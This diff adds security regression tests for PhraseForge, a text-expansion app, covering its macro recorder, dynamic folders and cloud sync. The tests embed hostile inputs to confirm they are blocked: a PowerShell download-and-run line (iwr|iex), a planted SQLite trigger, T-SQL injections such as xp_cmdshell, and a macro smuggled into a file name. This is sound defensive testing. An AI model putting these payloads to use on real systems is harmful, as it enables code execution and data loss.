@@ -896,3 +896,337 @@ def test_setlevel_inside_an_insert_stays_inside():
 def test_rtf_drops_control_characters():
     from phraseforge.rtf import escape
     assert escape("a\x00b\x0bc\x1fd\te\nf") == "abcd\\tab e\\line f"
+
+
+# ====================================================================== 0.6.8: R43-R62
+# Review of #34 (macro recorder), #35 (dynamic folders) and #36 (change-set sync).
+def test_mouse_clicks_need_an_approved_phrase():
+    """R43: an imported phrase clicked the Start button, typed a command and pressed Enter."""
+    content = '{#mouse click -x 24 -y 1060}{#sleep 800}powershell -c iwr x|iex{#key enter}'
+    assert security.scan_privileged(content) == [security.PRIVILEGED["mouse"]]
+    assert security.privileged_reason("mouse", ["wheel"], {}) == security.PRIVILEGED["mouse"]
+    from phraseforge.host import ExpansionContext
+    store = Store(":memory:")
+    out = _engine(store).expand_to_text(content, ExpansionContext(allow_privileged=False))
+    assert "[mouse: blocked" in out
+
+
+def test_mouse_wheel_delta_is_bounded():
+    store = Store(":memory:")
+    acts = _engine(store).expand("{#mouse wheel -delta 1000000000000}")
+    assert [a.delta for a in acts if getattr(a, "kind", "") == "wheel"] == [12000]
+
+
+def test_sql_triggers_in_a_pulled_copy_are_dropped(tmp_path):
+    """R44: a trigger planted in a cloud copy deleted every quarantine row, for good."""
+    from phraseforge.models import Phrase
+    evil = Store(tmp_path / "evil.db")
+    evil.add_phrase(Phrase("Pulled evil", '{#run "calc.exe"}'))
+    evil.conn.executescript(
+        "CREATE TRIGGER evil AFTER INSERT ON phrase_quarantine BEGIN "
+        "DELETE FROM phrase_quarantine WHERE phrase_id=NEW.phrase_id; END;"
+        "CREATE VIEW v AS SELECT 1;")
+    evil.close()
+    store = Store(":memory:")
+    store.restore_from(tmp_path / "evil.db", untrusted="synced")
+    names = {r[0] for r in store.conn.execute("SELECT name FROM sqlite_master WHERE type IN ('trigger','view')")}
+    assert names == {"folders_uid", "phrases_uid", "sticky_notes_uid"}
+    assert store.quarantine_origin(store.find_phrase("Pulled evil").id) == "synced"
+    opened = Store(tmp_path / "evil.db")                        # a file opened directly is cleaned too
+    assert "evil" not in {r[0] for r in opened.conn.execute("SELECT name FROM sqlite_master")}
+
+
+def _dyn_folder(store, name="Dyn"):
+    from phraseforge.models import Folder
+    return store.add_folder(Folder(name)).id
+
+
+def test_a_synced_dynamic_folder_is_not_approved_by_a_plain_ok(qapp, tmp_path, monkeypatch):
+    """R45: OK in the dialog approved a source the user never typed (it came with a sync)."""
+    from PySide6.QtWidgets import QMessageBox
+    from phraseforge import dynamic
+    from phraseforge.ui.dynamic_dialog import DynamicFolderDialog
+    store = Store(":memory:")
+    secret = tmp_path / "Login Data.txt"
+    secret.write_text("victim-secret-token", encoding="utf-8")
+    fid = _dyn_folder(store)
+    dynamic.set_config(store, fid, dynamic.DynamicConfig("text", str(secret)), approve=False)
+    asked = []
+    monkeypatch.setattr(QMessageBox, "warning", staticmethod(lambda *a, **k: asked.append(a[2]) or QMessageBox.No))
+    dlg = DynamicFolderDialog(store, fid)
+    assert dlg.save() is False and asked and "another PC" in asked[0]
+    assert not dynamic.approved(store, fid) and store.phrases(fid) == []
+
+
+def test_odbc_connection_string_stays_on_this_pc_and_sealed():
+    """R46: the ODBC string with PWD= was stored in the phrase file and synced out."""
+    from phraseforge import dynamic
+    from phraseforge.db import is_device_setting, is_secret_setting
+    store = Store(":memory:")
+    fid = _dyn_folder(store)
+    cs = "DRIVER={SQL Server};SERVER=db;UID=sa;PWD=Hunter2!"
+    dynamic.set_config(store, fid, dynamic.DynamicConfig("odbc", cs, "SELECT a FROM t"))
+    raw = store.conn.execute("SELECT config FROM dynamic_folders").fetchone()[0]
+    assert "Hunter2" not in raw
+    key = f"dynamic.conn.{fid}"
+    assert is_device_setting(key) and is_secret_setting(key)
+    stored = store.conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()[0]
+    assert "Hunter2" not in stored                                     # sealed (DPAPI / base64)
+    assert dynamic.config(store, fid).path == cs and dynamic.approved(store, fid)
+
+
+def test_dynamic_source_cannot_be_set_up_under_the_editing_lock(tmp_path):
+    """R47: set_config worked while the administrator had locked editing."""
+    from phraseforge import dynamic, policy
+    store = Store(":memory:")
+    fid = _dyn_folder(store)
+    f = tmp_path / "x.txt"
+    f.write_text("a", encoding="utf-8")
+    policy.set_current(policy.Policy(editing_disabled=True, source="t"))
+    try:
+        with pytest.raises(policy.PolicyError):
+            dynamic.set_config(store, fid, dynamic.DynamicConfig("text", str(f)))
+    finally:
+        policy.set_current(None)
+
+
+@pytest.mark.parametrize("q", ["WITH c AS (SELECT 1 AS a) DELETE FROM t", "SELECT 1 EXEC xp_cmdshell 'calc'",
+                               "SELECT * INTO pwned FROM t", "SELECT 1 UPDATE t SET a=2",
+                               "SELECT * FROM OPENROWSET('SQLNCLI','x','y')"])
+def test_dynamic_query_must_be_a_plain_select(q):
+    """R48: T-SQL needs no ';' between statements, so EXEC/UPDATE slipped past the check."""
+    from phraseforge import dynamic
+    with pytest.raises(dynamic.DynamicError):
+        dynamic._check_query(q)
+
+
+def test_dynamic_query_check_allows_ordinary_selects():
+    from phraseforge import dynamic
+    for q in ["select ';' as x", "SELECT REPLACE(body, 'a', 'b') FROM t WHERE x = 'drop table'"]:
+        assert dynamic._check_query(q)
+
+
+def test_dynamic_text_source_size_is_limited(tmp_path, monkeypatch):
+    """R49: a 100 MB text file took 9.6 GB of memory."""
+    from phraseforge import dynamic
+    monkeypatch.setattr(dynamic, "MAX_FILE_BYTES", 1000)
+    f = tmp_path / "big.txt"
+    f.write_text("x\n" * 1000, encoding="utf-8")
+    with pytest.raises(dynamic.DynamicError, match="larger"):
+        dynamic.read_items(dynamic.DynamicConfig("text", str(f)))
+
+
+def test_recorder_forgets_keys_and_skips_what_the_check_rejects(qapp):
+    """R50: keys stayed in memory after a recording; skip_key keeps PhraseForge's own windows out."""
+    from phraseforge.recorder import Recorder
+    r = Recorder(password_check=lambda: True)
+    r.start()
+    for ch in "secret":
+        r.key(ord(ch.upper()), ch, set())
+    assert r.events == [] and r.skipped_passwords == 6
+    from phraseforge.ui import recording_bar
+    store = Store(":memory:")
+    got = []
+    ctl = recording_bar.RecordingController(store, got.append, post=lambda f: f())
+    ctl.recorder.start()
+    ctl.recorder.key(ord("A"), "a", set())
+    ctl.bar = None
+    ctl.session = type("S", (), {"stop": lambda self: None})()
+    ctl.finish()
+    assert got == ["a"] and ctl.recorder.events == []
+
+
+def test_encrypting_wipes_the_plain_sync_base(tmp_path):
+    """R51: a plain .sync-base.db with every phrase stayed next to the encrypted file."""
+    from phraseforge import vault
+    from phraseforge.models import Phrase
+    store = Store(tmp_path / "B.db")
+    store.add_phrase(Phrase("Secret", "victim text"))
+    base = tmp_path / "B.sync-base.db"
+    store.backup_to(base)
+    try:
+        store.enable_encryption(passphrase="pw", use_dpapi=False)
+    except vault.VaultError as e:
+        pytest.skip(f"encryption not available here: {e}")
+    assert not base.exists()
+    store.close()
+
+
+def _sync_pair(tmp_path):
+    from phraseforge import policy
+    from phraseforge.cloud.sync import CloudSync, FolderRemote
+    from phraseforge.models import Phrase
+    policy.set_current(policy.NO_POLICY)
+    cloud = tmp_path / "cloud"
+    a, b = Store(tmp_path / "A.db"), Store(tmp_path / "B.db")
+    sa, sb = CloudSync(a, FolderRemote(cloud), device="A"), CloudSync(b, FolderRemote(cloud), device="B")
+    a.add_phrase(Phrase("Base", "x"))
+
+    def run(cs):
+        res = cs.sync()
+        if res.action in ("pulled", "merged"):
+            cs.apply_pull(res.pulled_file, res.remote_rev)
+        return res
+    assert run(sa).action == "pushed" and run(sb).action == "pulled"
+    return a, b, sa, sb, cloud, run
+
+
+def _tamper(cloud, *sql):
+    import json as _json
+    from phraseforge.cloud.sync import SYNC_NAME
+    f = cloud / SYNC_NAME
+    con = sqlite3.connect(str(f))
+    with con:
+        for s in sql:
+            con.execute(*s) if isinstance(s, tuple) else con.executescript(s)
+    con.close()
+    meta = f.with_suffix(".json")
+    props = _json.loads(meta.read_text())
+    props["rev"], props["hash"] = int(props["rev"]) + 1, "x"
+    meta.write_text(_json.dumps(props))
+
+
+def test_a_broken_remote_copy_does_not_block_every_sync(tmp_path):
+    """R52: a bad trigger kind in the other copy made sync() raise on every run."""
+    from phraseforge.models import Phrase
+    from phraseforge import policy
+    a, b, sa, sb, cloud, run = _sync_pair(tmp_path)
+    try:
+        _tamper(cloud, "UPDATE triggers SET kind='nope'", "INSERT INTO triggers (phrase_id, kind, value) "
+                "SELECT id, 'nope', 'x' FROM phrases")
+        b.add_phrase(Phrase("B local", "b"))
+        assert sb.sync().action in ("conflict", "merged")          # asks instead of raising
+    finally:
+        policy.set_current(None)
+
+
+def test_a_future_timestamp_does_not_stick(tmp_path):
+    """R54: modified='9999' in the other copy won the conflict and stayed on the phrase, so
+    it went on beating every later edit made on this PC. A future stamp now counts as the
+    time of the merge, and whatever the other copy's text, it arrives quarantined."""
+    from phraseforge import policy
+    a, b, sa, sb, cloud, run = _sync_pair(tmp_path)
+    try:
+        p = b.find_phrase("Base")
+        p.content = "B's text"
+        b.update_phrase(p)
+        _tamper(cloud, "UPDATE phrases SET content='{#run evil.exe}', modified='9999-12-31T00:00:00'")
+        run(sb)
+        p = b.find_phrase("Base")
+        assert (p.modified or "") < "9000"
+        if "evil" in p.content:
+            assert b.quarantine_origin(p.id) == "synced"
+    finally:
+        policy.set_current(None)
+
+
+def test_a_sync_cannot_remove_a_folder_password(tmp_path):
+    """R55: the other copy cleared password_hash, and the phrase came out unquarantined."""
+    from phraseforge.models import Folder, Phrase
+    from phraseforge import policy
+    store = Store(":memory:")
+    f = store.add_folder(Folder("Vault", password_hash="scrypt$x"))
+    store.add_phrase(Phrase("Secret", "{#run vault.exe}", folder_id=f.id))
+    store.backup_to(tmp_path / "copy.db")
+    con = sqlite3.connect(str(tmp_path / "copy.db"))
+    with con:
+        con.execute("UPDATE folders SET password_hash=''")
+    con.close()
+    policy.set_current(policy.NO_POLICY)
+    try:
+        store.restore_from(tmp_path / "copy.db", untrusted="synced")
+    finally:
+        policy.set_current(None)
+    assert store.get_folder(f.id).password_hash == "scrypt$x"
+    # moving the phrase out of the locked folder changes its fingerprint (and so quarantines it)
+    before = store.phrase_fingerprints()
+    p = store.find_phrase("Secret")
+    p.folder_id = None
+    store.update_phrase(p, record_history=False)
+    assert store.phrase_fingerprints()[p.id] != before[p.id]
+
+
+def test_a_pull_keeps_a_local_copy_first(tmp_path):
+    """R56: the only backup before a pull went to the cloud the pull came from."""
+    from phraseforge import policy
+    a, b, sa, sb, cloud, run = _sync_pair(tmp_path)
+    policy.set_current(None)
+    assert (tmp_path / "B.before-sync.db").exists()
+
+
+def test_recorder_settings_stay_on_this_pc():
+    """R57: a synced recorder.stop_hotkey='e' stopped every recording at the first e."""
+    from phraseforge.db import is_device_setting
+    from phraseforge.recorder import Recorder
+    assert is_device_setting("recorder.stop_hotkey") and is_device_setting("recorder.max_pause_ms")
+    t = [0.0]
+    r = Recorder(lambda k, d="": "0" if k == "recorder.max_pause_ms" else d, clock=lambda: t[0])
+    r.start()
+    r.key(ord("A"), "a", set())
+    t[0] = 86400.0
+    r.key(ord("B"), "b", set())
+    assert "{#sleep 60000}" in r.stop()
+
+
+def test_recorder_drops_middle_clicks_and_merges_real_wheels_only():
+    """R58: a middle click replayed as a left click; typed wheel text swallowed real scrolls."""
+    from phraseforge.recorder import Recorder
+    t = [0.0]
+    r = Recorder(clock=lambda: t[0])
+    r.start()
+    r.click("middle", 10, 20)
+    for ch in "{#mouse wheel -delta 120}":
+        r.key(0x41, ch, set())
+    r.wheel(120)
+    t[0] += 0.05
+    r.wheel(120)
+    out = r.stop()
+    assert "-x 10" not in out
+    assert out.endswith("{{#mouse wheel -delta 120}{#mouse wheel -delta 240}")
+
+
+def test_dynamic_approval_does_not_pass_to_a_new_folder(tmp_path):
+    """R59: a deleted folder's approval was inherited by a new one with the same id."""
+    from phraseforge import dynamic
+    store = Store(":memory:")
+    f = tmp_path / "x.txt"
+    f.write_text("a", encoding="utf-8")
+    fid = _dyn_folder(store)
+    cfg = dynamic.DynamicConfig("text", str(f))
+    dynamic.set_config(store, fid, cfg)
+    store.delete_folder(fid)
+    fid2 = _dyn_folder(store, "Other")
+    dynamic.set_config(store, fid2, cfg, approve=False)
+    assert fid2 == fid and not dynamic.approved(store, fid2)
+
+
+def test_dynamic_folder_source_skips_links_and_brace_names(tmp_path):
+    """R60/R61: a symlink to /etc/passwd was read; a "}" in a file name injected a macro."""
+    from phraseforge import dynamic
+    root = tmp_path / "src"
+    root.mkdir()
+    (root / "ok.txt").write_text("fine", encoding="utf-8")
+    (root / "x}{#run calc}.txt").write_text("bad", encoding="utf-8")     # Windows allows braces, not quotes
+    outside = tmp_path / "secret.txt"
+    outside.write_text("secret", encoding="utf-8")
+    try:
+        (root / "link.txt").symlink_to(outside)
+    except OSError:
+        pass
+    items = dynamic.read_items(dynamic.DynamicConfig("folder", str(root), link=True))
+    assert [i.description for i in items] == ["ok"]
+
+
+def test_an_empty_read_keeps_the_dynamic_phrases(tmp_path):
+    """R62: a source that was empty for a moment deleted every phrase in the folder."""
+    from phraseforge import dynamic
+    store = Store(":memory:")
+    f = tmp_path / "x.txt"
+    f.write_text("one\ntwo", encoding="utf-8")
+    fid = _dyn_folder(store)
+    dynamic.set_config(store, fid, dynamic.DynamicConfig("text", str(f)))
+    assert dynamic.refresh(store, fid) == (2, 0, 0)
+    f.write_text("", encoding="utf-8")
+    with pytest.raises(dynamic.DynamicError):
+        dynamic.refresh(store, fid)
+    assert len(store.phrases(fid)) == 2
